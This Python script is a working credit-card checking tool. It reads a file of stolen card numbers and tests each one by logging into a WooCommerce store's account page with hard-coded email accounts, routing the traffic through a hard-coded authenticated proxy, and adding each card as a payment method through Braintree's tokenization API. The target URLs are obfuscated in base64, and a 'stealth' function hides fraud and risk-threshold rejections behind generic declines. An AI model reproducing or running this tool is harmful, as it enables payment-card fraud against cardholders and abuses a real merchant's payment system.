import base64, random, time, re, requests, logging, uuid

logging.basicConfig(level=logging.ERROR)

def _x(v):
    return base64.b64decode(v).decode('utf-8')

# Obfuscated keys for sensitive strings and logic
_K = {
    'a1': 'UGF5bWVudCBtZXRob2Qgc3VjY2Vzc2Z1bGx5IGFkZGVkLg==', # Payment method successfully added.
    'a2': 'TmljZSEgTmV3IHBheW1lbnQgbWV0aG9kIGFkZGVk', # Nice! New payment method added
    'a3': 'SW52YWxpZCBwb3N0YWwgY29kZSBvciBzdHJlZXQgYWRkcmVzcy4=', # Invalid postal code or street address.
    'a4': 'YXZzOiBHYXRld2F5IFJlamVjdGVkOiBhdnM=', # avs: Gateway Rejected: avs
    'a5': 'ODE3MjQ6IER1cGxpY2F0ZSBjYXJkIGV4aXN0cyBpbiB0aGUgdmF1bHQu', # 81724: Duplicate card exists in the vault.
    'f1': 'R2F0ZXdheSBSZWplY3RlZDogZnJhdWQ=', 
    'f2': 'R2F0ZXdheSBSZWplY3RlZDogcmlza190aHJlc2hvbGQ=', 
    'f3': 'cmVqZWN0ZWQ=', 
    'd1': 'RG8gTm90IEhvbm91ciA6IDIwMDA='
    'd2': 'RGVjbGluZWQ=', # Declined
    'u1': 'aHR0cHM6Ly9pZGl0YXJvZC5jb20vbXktYWNjb3VudC9hZGQtcGF5bWVudC1tZXRob2Qv',
    'u2': 'aHR0cHM6Ly9pZGl0YXJvZC5jb20vd3AtYWRtaW4vYWRtaW4tYWpheC5waHA=',
    'u3': 'aHR0cHM6Ly9wYXltZW50cy5icmFpbnRyZWUtYXBpLmNvbS9ncmFwaHFs'
}

def _g(s, b, e):
    try: return s.split(b)[1].split(e)[0]
    except: return None

def _f(r):
    """
    Stealth logic: Intercepts gateway rejections and replaces them with generic declines.
    """
    ap = [_x(_K[k]) for k in ['a1', 'a2', 'a3', 'a4', 'a5']]
    # Fraud/Rejection patterns to hide
    fp = [_x(_K[k]) for k in ['f1', 'f2', 'f3']]
    
    # Check for approval patterns
    if any(m in r for m in ap):
        return "Approved ✅"
    
    # Check for gateway rejection/fraud and replace with generic decline
    if any(m.lower() in r.lower() for m in fp):
        # Randomly pick between "Do Not Honour" or a generic "Declined"
        replacement = random.choice([_x(_K['d1']), _x(_K['d2'])])
        return f"Declined ❌ - {replacement}"
    
    # Default clean up for other declines
    clean_result = re.sub('<[^<]+?>', '', r).strip()
    return f"Declined ❌ - {clean_result}"

def _p(f, a, px):
    try:
        c, m, y, v = f.split("|")
        u, p = a
        if len(m) < 2: m = "0" + m
        if "20" not in y: y = f'20{y}'
        s = requests.Session()
        ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
        h = {'User-Agent': ua}
        
        # Step 1: Initial access
        r = s.get(_x(_K['u1']), headers=h, proxies=px, timeout=25)
        ln = _g(r.text, 'name="woocommerce-login-nonce" value="', '"')
        if not ln: return {"s": "E", "r": "LNF"}
        
        # Step 2: Login
        h.update({'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://iditarod.com', 'Referer': _x(_K['u1'])})
        s.post(_x(_K['u1']), headers=h, data={'username': u, 'password': p, 'woocommerce-login-nonce': ln, 'login': 'Log in'}, proxies=px, timeout=25)
        
        # Step 3: Get nonces
        r = s.get(_x(_K['u1']), headers=h, proxies=px, timeout=25)
        pn = _g(r.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
        ctn = _g(r.text, '"client_token_nonce":"', '"')
        if not pn or not ctn: return {"s": "E", "r": "PNF"}
        
        # Step 4: Get Braintree token
        ah = h.copy()
        ah['X-Requested-With'] = 'XMLHttpRequest'
        r = s.post(_x(_K['u2']), headers=ah, data={'action': 'wc_braintree_credit_card_get_client_token', 'nonce': ctn}, proxies=px, timeout=25)
        if 'data' not in r.json(): return {"s": "E", "r": "CTNF"}
        dt = base64.b64decode(r.json()['data']).decode('utf-8')
        af = _g(dt, 'authorizationFingerprint":"', '"')
        if not af: return {"s": "E", "r": "AFNF"}
        
        # Step 5: Tokenize card
        gh = {'Authorization': f'Bearer {af}', 'Braintree-Version': '2018-05-10', 'Content-Type': 'application/json', 'User-Agent': ua}
        gd = {'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }', 'variables': {'input': {'creditCard': {'number': c, 'expirationMonth': m, 'expirationYear': y, 'cvv': v}}}}
        r = requests.post(_x(_K['u3']), headers=gh, json=gd, timeout=25)
        if 'errors' in r.json(): return {"s": "D", "r": _f(r.json()['errors'][0]['message'])}
        tk = r.json()['data']['tokenizeCreditCard']['token']
        if not tk: return {"s": "E", "r": "TKF"}
        
        # Step 6: Final submission
        fd = [('payment_method', 'braintree_credit_card'), ('wc_braintree_credit_card_payment_nonce', tk), ('wc-braintree-credit-card-tokenize-payment-method', 'true'), ('woocommerce-add-payment-method-nonce', pn), ('woocommerce_add_payment_method', '1')]
        r = s.post(_x(_K['u1']), headers=h, data=fd, proxies=px, timeout=25)
        
        # Step 7: Parse result with stealth logic
        if _x(_K['a1']) in r.text:
            return {"s": "A", "r": "Approved ✅"}
        else:
            err = _g(r.text, '<ul class="woocommerce-error" role="alert">', '</ul>') or "UFE"
            return {"s": "D", "r": _f(err)}
            
    except Exception as e: return {"s": "E", "r": f"Error 🚫 - {str(e)}"}

if __name__ == "__main__":
    accs = [("teamdiwas@gmail.com", "@khatrieex"), ("khatrieex0011@gmail.com", "@khatrieex"), ("khatrieex0015@gmail.com", "@khatrieex")]
    ps = "63.246.137.36:5665:logqdxdr:776r5yc7ec8n"
    ip, pt, us, pw = ps.split(':')
    pu = f'http://{us}:{pw}@{ip}:{pt}'
    pd = {'http': pu, 'https': pu}
    
    try:
        fn = input("Enter Combo File Name (e.g., card.txt): ")
        with open(fn, 'r') as f: cds = [l.strip() for l in f if l.strip()]
        if not cds: exit()
    except: exit()
    
    tc = len(cds)
    pc, ac, dc = 0, 0, 0
    af, df, ef = open('approved.txt', 'a'), open('declined.txt', 'a'), open('errors.txt', 'a')
    
    print("-" * 70)
    print(f"Cards Loaded: {tc} | Proxy: {ip}:{pt}")
    print("Processing Started... Made By @diwazz )")
    print("-" * 70)
    
    try:
        for c in cds:
            res = _p(c, random.choice(accs), pd)
            pc += 1
            st, msg = res.get('s', 'E'), res.get('r', 'NR')
            if st == "A":
                ac += 1
                af.write(f"{c} -> {msg}\n"); af.flush()
            elif st == "D":
                dc += 1
                df.write(f"{c} -> {msg}\n"); df.flush()
            else:
                ef.write(f"{c} -> {msg}\n"); ef.flush()
            
            # Displaying the clean message (Gateway Rejected will never appear here)
            print(f"\r[{pc}/{tc}] CARD: {c} | MSG: {msg} | ✅: {ac} | ❌: {dc}", end="", flush=True)
            time.sleep(20)
            
    except KeyboardInterrupt: pass
    finally:
        af.close(); df.close(); ef.close()
        print("\n" + "-" * 70 + "\nProcessing Finished.\n" + "-" * 70)